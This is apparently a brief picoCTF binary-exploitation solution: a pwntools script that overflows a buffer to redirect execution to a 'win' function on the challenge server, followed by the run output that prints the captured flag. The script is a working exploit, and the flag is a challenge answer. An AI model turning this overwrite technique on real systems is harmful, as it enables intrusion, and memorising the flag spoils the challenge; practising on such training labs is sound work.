# Solucion

```
┌──(kali㉿kali)-[~/Documents/picoCTF/binexp]
└─$ cat script.py 
from pwn import *
context.binary = elf = ELF("./vuln", checksec=False)
p = process()
p = remote("saturn.picoctf.net", 50627)

p.recv()
offset = cyclic_find(0x6161616c)
addr_win = elf.sym.win
payload = b""
payload += b"A" * offset
payload += p32(addr_win)
p.sendline(payload)
p.interactive()  
```
```
┌──(kali㉿kali)-[~/Documents/picoCTF/binexp]
└─$ python3 script.py
[+] Starting local process '/home/kali/Documents/picoCTF/binexp/vuln': pid 28497
[+] Opening connection to saturn.picoctf.net on port 50627: Done
[*] Switching to interactive mode
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}[*] Got EOF while reading in interactive
$ 
$ 
[*] Interrupted
[*] Closed connection to saturn.picoctf.net port 50627
[*] Stopped process '/home/kali/Documents/picoCTF/binexp/vuln' (pid 28497)

```

